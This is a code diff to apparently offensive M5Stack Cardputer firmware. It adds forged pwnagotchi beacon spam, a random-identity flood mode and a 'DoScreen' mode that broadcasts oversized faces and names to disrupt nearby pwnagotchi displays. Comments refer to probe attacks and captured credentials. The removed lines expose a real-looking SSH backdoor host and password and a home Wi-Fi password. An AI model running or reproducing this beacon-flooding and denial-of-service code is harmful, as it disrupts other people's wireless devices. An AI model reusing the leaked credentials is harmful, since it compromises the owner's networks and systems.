@@ -77,9 +77,9 @@ String scanIp = "";
 
 //!!!!!! CHANGE THIS !!!!!
 //!!!!!! CHANGE THIS !!!!!
-String ssh_user = "kali";
-String ssh_host = "192.168.1.88";
-String ssh_password = "ThisIsBackDoor/8520.";
+String ssh_user = "";
+String ssh_host = "";
+String ssh_password = "";
 int ssh_port = 22;
 //!!!!!! CHANGE THIS !!!!!
 //!!!!!! CHANGE THIS !!!!!
@@ -123,8 +123,8 @@ int topVisibleIndex = 0;
 // Connect to nearby wifi network automaticaly ro provide internet to the core2 you can be connected and provide AP at same time
 //!!!!!! CHANGE THIS !!!!!
 //!!!!!! CHANGE THIS !!!!!
-const char* ssid = "Livebox-3E68"; // ssid to connect,connection skipped at boot if stay blank ( can be shutdown by different action like probe attack)
-const char* password = "E5FCED9AD455FDF97715CDD29F"; // wifi password
+const char* ssid = ""; // ssid to connect,connection skipped at boot if stay blank ( can be shutdown by different action like probe attack)
+const char* password = ""; // wifi password
 //!!!!!! CHANGE THIS !!!!!
 //!!!!!! CHANGE THIS !!!!!
 // password for web access to remote check captured credentials and send new html file !!!!!! CHANGE THIS !!!!!
@@ -7529,6 +7529,9 @@ void scanPorts(IPAddress host) {
 
 // Global flag to control the spam task
 volatile bool spamRunning = false;
+volatile bool stop_beacon = false;
+volatile bool dos_pwnd = false;
+volatile bool change_identity = false;
 
 // Global arrays to hold the faces and names
 const char* faces[30];  // Increase size if needed
@@ -7553,7 +7556,18 @@ const uint8_t beacon_frame_template[] = {
   0x64, 0x00,  // Beacon interval
   0x11, 0x04   // Capability info
 };
-// taken and refactored from https://github.com/viniciusbo/m5-palnagotchi/tree/master/palnagotchi
+
+
+// Function to generate a random string that resembles a SHA-256 hash
+String generate_random_identity() {
+  const char hex_chars[] = "0123456789abcdef";
+  String random_identity = "";
+  for (int i = 0; i < 64; ++i) {
+    random_identity += hex_chars[random(0, 16)];
+  }
+  return random_identity;
+}
+
 void send_pwnagotchi_beacon(uint8_t channel, const char* face, const char* name) {
   DynamicJsonDocument json(2048);
   json["pal"] = true;
@@ -7561,7 +7575,11 @@ void send_pwnagotchi_beacon(uint8_t channel, const char* face, const char* name)
   json["face"] = face; // change to {} to freeze the screen
   json["epoch"] = 1;
   json["grid_version"] = "1.10.3";
-  json["identity"] = "0451ba5054b258a24ba3adff2c5e3b637f28de36cb5e20d7cd960ec27b7c1164"; // change to {} to crash pwngrid
+  if (change_identity) {
+    json["identity"] = generate_random_identity();
+  } else {
+    json["identity"] = "32e9f315e92d974342c93d0fd952a914bfb4e6838953536ea6f63d54db6b9610";
+  }
   json["pwnd_run"] = 0;
   json["pwnd_tot"] = 0;
   json["session_id"] = "a2:00:64:e6:0b:8b";
@@ -7601,24 +7619,46 @@ void send_pwnagotchi_beacon(uint8_t channel, const char* face, const char* name)
   esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame, sizeof(beacon_frame), false);
 }
 
+const char* pwnd_faces[] = {
+  "NOPWND!■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■\n■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■"
+};
+const char* pwnd_names[] = {
+  "■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■"
+};
+
 // Tâche pour envoyer des trames beacon avec changement de face, de nom et de canal
 void beacon_task(void* pvParameters) {
   const uint8_t channels[] = {1, 6, 11};  // Liste des canaux Wi-Fi à utiliser
   const int num_channels = sizeof(channels) / sizeof(channels[0]);
+  const int num_pwnd_faces = sizeof(pwnd_faces) / sizeof(pwnd_faces[0]);
 
   while (spamRunning) {
-    for (int i = 0; i < num_faces; ++i) {
+    if (dos_pwnd) {
+      // Send PWND beacons
       for (int ch = 0; ch < num_channels; ++ch) {
-        if (!spamRunning) break;
-        send_pwnagotchi_beacon(channels[ch], faces[i], names[i % num_names]);
-        vTaskDelay(200 / portTICK_PERIOD_MS);  // Attendre 0.2 seconde
+        if (stop_beacon) {
+          break;
+        }
+        send_pwnagotchi_beacon(channels[ch], pwnd_faces[0], pwnd_names[0]);
+        vTaskDelay(200 / portTICK_PERIOD_MS);  // Wait 200 ms
       }
-      if (!spamRunning) break;
+    } else {
+      // Send regular beacons
+      for (int i = 0; i < num_faces; ++i) {
+        for (int ch = 0; ch < num_channels; ++ch) {
+          if (stop_beacon) {
+            break;
+          }
+          send_pwnagotchi_beacon(channels[ch], faces[i], names[i % num_names]);
+          vTaskDelay(200 / portTICK_PERIOD_MS);  // Wait 200 ms
+        }
+      }
     }
   }
 
   vTaskDelete(NULL);
 }
+
 void displaySpamStatus() {
   enterDebounce();
   M5.Display.clear();
@@ -7626,8 +7666,6 @@ void displaySpamStatus() {
   M5.Display.setTextColor(TFT_WHITE , TFT_BLACK);
   M5.Display.setCursor(0, 10);
   M5.Display.println("PwnGrid Spam Running...");
-  M5.Display.setCursor(0, 30);
-  M5.Display.println("Press 'Enter' to stop.");
 
   int current_face_index = 0;
   int current_name_index = 0;
@@ -7644,12 +7682,31 @@ void displaySpamStatus() {
       waitAndReturnToMenu("Back to menu");
       break;
     }
+    if (M5Cardputer.Keyboard.isKeyPressed('d')) {
+      dos_pwnd = !dos_pwnd;
+      Serial.printf("DoScreen %s.\n", dos_pwnd ? "enabled" : "disabled");
+    }
+    if (M5Cardputer.Keyboard.isKeyPressed('f')) {
+      change_identity = !change_identity;
+      Serial.printf("Change Identity %s.\n", change_identity ? "enabled" : "disabled");
+    }
 
     // Update and display current face, name, and channel
-    M5.Display.setCursor(0, 50);
-    M5.Display.printf("Face: \n%s                                              ", faces[current_face_index]);
-    M5.Display.setCursor(0, 80);
-    M5.Display.printf("Name:                  \n%s                                              ", names[current_name_index]);
+    M5.Display.setCursor(20, 30);
+    M5.Display.printf("Flood:%s", change_identity ? "1" : "0");
+    M5.Display.setCursor(100, 30);
+    M5.Display.printf("DoScreen:%s", dos_pwnd ? "1" : "0");
+    if (!dos_pwnd) {
+      M5.Display.setCursor(0, 50);
+      M5.Display.printf("Face: \n%s                                              ", faces[current_face_index]);
+      M5.Display.setCursor(0, 80);
+      M5.Display.printf("Name:                  \n%s                                              ", names[current_name_index]);
+    } else {
+      M5.Display.setCursor(0, 50);
+      M5.Display.printf("Face:\nNOPWND!■■■■■■■■■■■■■■■■■");
+      M5.Display.setCursor(0, 80);
+      M5.Display.printf("Name:\n■■■■■■■■■■■■■■■■■■■■■■■■");
+    }
     M5.Display.setCursor(0, 110);
     M5.Display.printf("Channel: %d  ", channels[current_channel_index]);
 
